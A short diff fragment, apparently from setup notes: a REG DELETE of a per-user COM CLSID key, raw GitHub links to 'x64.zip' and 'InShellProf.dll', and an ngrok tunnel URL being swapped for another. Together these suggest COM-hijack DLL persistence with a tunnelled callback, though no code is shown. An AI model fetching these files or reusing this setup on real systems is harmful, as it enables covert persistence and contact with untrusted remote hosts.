@@ -14,4 +14,4 @@ REG DELETE "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" 
 https://github.com/Sanket-kumbhar/testing-win/raw/refs/heads/main/x64.zip
 https://github.com/Sanket-kumbhar/testing-win/raw/refs/heads/main/InShellProf.dll
 
-https://c056-49-32-197-174.ngrok-free.app/
+ https://c566-150-107-23-254.ngrok-free.app
